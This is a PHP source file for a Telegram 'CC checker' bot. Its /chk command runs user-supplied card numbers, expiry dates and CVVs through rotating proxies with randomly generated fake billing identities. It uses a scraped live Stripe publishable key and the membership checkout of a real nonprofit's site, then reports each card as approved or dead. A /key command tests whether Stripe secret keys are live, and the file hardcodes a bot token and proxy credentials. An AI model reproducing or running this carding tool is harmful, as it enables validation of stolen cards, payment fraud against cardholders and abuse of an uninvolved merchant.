<?php
//==============[CC CHECKER BOT API MADE BY [🇮🇳]DRAGON MASTER]================//

//=======[Webhook]========https://api.telegram.org/bot<token>/setwebhook?url=<url>

//================[Telegram BOT API TOKEN ]================//
$botToken = "1783978382:AAE6Lt2t6YpIopXxolZhc9b23h-BLwoGIdY"; #<------------------- PUT YOUR TOKEN HERE------------->#
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//================[Start Command]================//

if ((strpos($message, "/start") === 0)||(strpos($message, "/start") === 0)){
sendMessage ($chatId, "<b>Hello @$username!! Check my commands by entering /cmds</b>", $message_id);
}

//=============[Command Section]============//

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "GATEWAYS%0A%0A<b>STRIPE</b> [CVV/CCN] <code>/chk cc|mm|yy|cvv</code>%0A✅STATUS :- LIVE%0A%0A<b>SK [LIVE]</b> <code>/key sk_live</code>%0A✅STATUS :- LIVE%0A%0A<b>INFO</b> /info %0A✅STATUS :- LIVE%0A%0A<b>BIN [CHECK]</b> <code>/bin xxxxxx</code>%0A✅STATUS :- LIVE%0A%0ABOT MADE BY:- <b><i>[🇮🇳] DRAGON MASTER</i></b>");
}

//=========[Bin Command]=========//


elseif ((strpos($message, "/bin $bin") === 0)||(strpos($message, "!bin $bin") === 0)||(strpos($message, ".bin $bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$bin = substr("$bin", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
};
sendMessage($chatId, '<b>🟢Valid Bin :- </b>'.$bin.'%0A<b>✦ Bank:</b> '.$bank.'%0A<b>✦ Country:</b> '.$name.''.$emoji.'%0A<b>✦ Brand:</b> '.$brand.'%0A<b>✦ Card:</b> '.$scheme.'%0A<b>✦ Type:</b> '.$type.'%0A<b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>✦ CHECKED BY -</b>: @'.$username.'%0A<b>✦ BOT BY</b>:<a> [🇮🇳]DRAGON MASTER</a>', $message_id);
}
//=========[Bin Command-END]=========//


//=========[Info Command]=========//

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "✦ Chat [ID]: <code>$chatId</code>%0A✦ Name: $firstname%0A✦ Username: @$username%0A%0A✦<b>Bot Made by: [🇮🇳]DRAGON MASTER </b>");
}
//=========[Info Command-END]=========//

//=========[ID Command]=========//

elseif ((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0)){
sendMessage($chatId, "<b>This chat's ID is:</b> <code>$chatId</code>");
}
//=========[ID]=========//


//=================================================RANDOM USER AGENT=====================================================//
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();


//=================================================RANDOM USER AGENT===========================================================//


//============[CHK]==[STRIPE CCN]=================//

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

//=======================[Proxys]=============================//
$rp1 = array(
 1 => 'jfwwimuy-rotate:33famj0tf7x5',
  2 => 'btiqkcam-rotate:wy44nix7qtau',
  3 => 'ybxwhgmc-rotate:e7tzjbvj9sb7',
  4 => 'ilttewus-rotate:sk5m1dfre3wy',
  5 => 'gorlyibp-rotate:mf2khaumzl5e',
  6=> 'zdtyowfi-rotate:eiqwi7g0jlcv',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

//echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//

//=======================[1 REQ]==================================//

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
//'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: asp_transient_id=4808fbe05b7c407c7d66382e3fdae769; PHPSESSID=a01dfbe6471cd53bcc4e1567d9f02024',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=this+terr+%2C+that&billing_details[address][line2]=dhsfd&billing_details[address][city]=brooklyn&billing_details[address][state]=NY&billing_details[address][postal_code]=11201&billing_details[address][country]=US&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6a7c2a7a-0bec-4e5c-a8b3-67d233c002ccfdc663&muid=6ab84358-aa37-47a1-bd89-23d38083a521af0fec&sid=e4f49e17-5c85-4984-a312-aad8209e73d0f07dc6&pasted_fields=number&payment_user_agent=stripe.js%2F1aa2527f3%3B+stripe-js-v3%2F1aa2527f3&time_on_page=68319&referrer=https%3A%2F%2Fnvhch.org%2F&key=pk_live_jHcgLFU0gz1Ng4GNg0JVdays00fcvw6IY9');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);

//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://nvhch.org/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: nvhch.org',
'method: POST',
//'path: /wp-admin/admin-ajax.php',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: PHPSESSID=05c91dbca3b324c4e034857ca0804d3b; pmpro_visit=1; visid_incap_2508754=Jn97amzpT6SLqIdBBf4SDpx/gWAAAAAAQUIPAAAAAADuKAkaObQaNgZ8T00RlbQV; incap_ses_1358_2508754=3p8yaNDR3UhpK76t7pXYEp9/gWAAAAAAoMLTy79utYfJW52KwnTBHA==; __stripe_mid=6ab84358-aa37-47a1-bd89-23d38083a521af0fec; __stripe_sid=e4f49e17-5c85-4984-a312-aad8209e73d0f07dc6',
'origin: https://nvhch.org',
'referer: https://nvhch.org/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username='.$firstname.'121&password=Teamvsh3&password2=Teamvsh3&bemail='.$name.'40@gmail.com&bconfirmemail='.$name.'40@gmail.com&fullname=&bfirstname='.$name.'&blastname='.$last.'&baddress1=this+terr+%2C+that&baddress2=dhsfd&bcity=brooklyn&bstate=NY&bzipcode=11201&bcountry=US&bphone=%28504%29+556-0798&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
  $result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);
//=======================[2 REQ-END]==============================//

//====================[CHK]===[Responses]==============================//

if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){

sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Your Card Zip Code Is Incorrect.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}

elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- CVV PASS] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}

elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Insufficient Funds.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}


elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>[✅ APPROVED] CCN </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R-incorrect_cvc] [C-B:- @'.$username.'][M-B:- @DragonBin]</b>');
}

elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Card Doesnt Support This Purchase.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}

elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<b>[✅ APPROVED] CVV </b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Pickup/Lost/Stolen.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}


elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Do Not Honor] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}

elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Incorrect Card Number.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}


elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Expired Card.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}


elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' <b>[' . $type . '-' . $brand . '-' . $name2 . '-' . $currency . '$$$] [R- Your Card Was Declined.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}

elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Generic_Decline.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Generic_Decline.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Security Code Check : '.$cvc_check.' (Proxy Dead/change IP) ] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}

elseif (strpos($result2, '-1')){
sendMessage($chatId, '<b>[❌ Dead]</b> '.$lista.' [<i>' . $type . '-' . $brand . '-' . $name1 . '-' . $currency . '$</i>] <b> [R- Update Nonce.] [C-B:- @'.$username.'] [M-B:- @DragonBin]</b>');
}

elseif ((strpos($result2, "missing input"))){
sendMessage($chatId, '❌Invalid Command❌%0A❗️GATE CHK AUTH%0A❗️Example: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /chk 4010990064374103|09|2026|345');
}

elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}
//====================[CHK]===[Responses]==============================//

//================[SK CHECK]===================//

elseif ((strpos($message, "/key") === 0)||(strpos($message, "!key") === 0)||(strpos($message, ".key") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);


if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>🔴EXPIRED KEY</b>%0A<u>✦Key:</u> <code>$sec</code>%0A<b>✦Message: <b>Expired API key Provided%0A</b>✦Checked by:</b> @$username%0A<b>✦Bot Made by:[🇮🇳]DRAGON MASTER</b>", $message_id);
}elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>🔴INVALID KEY</b>%0A<b>✦Key:</b> <code>$sec</code>%0A<b>✦Message: <b>Invalid API Key provided.%0A</b>✦Checked by: </b>@$username%0A<b>✦Bot Made by:[🇮🇳]DRAGON MASTER</b>", $message_id);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
sendMessage($chatId, "<b>🔴NO KEY PROVIDED%0A✦Message:</b><b> You did not provide an API key.%0A</b><b>✦Checked by:</b> @$username%0A<b>✦Bot Made by:[🇮🇳]DRAGON MASTER</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>🔴DEAD KEY</b>%0A<b>✦Key:</b> <code>$sec</code>%0A<b>✦Message: <b>Testmode charges only.%0A</b>✦Checked by:</b> @$username%0A<b>✦Bot Made by:[🇮🇳]DRAGON MASTER</b>", $message_id);
}else{
sendMessage($chatId, "<b>🟢LIVE KEY</b>%0A<b>✦Key:</b><code>$sec</code>%0A<b>✦Message:<b> Live API key provided.%0A</b>✦Checked by:</b> @$username%0A<b>✦Bot Made by:[🇮🇳]DRAGON MASTER</b>", $message_id);
}
}

//================[SK CHECK]===================//

//================[FUNCTION]==================//

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>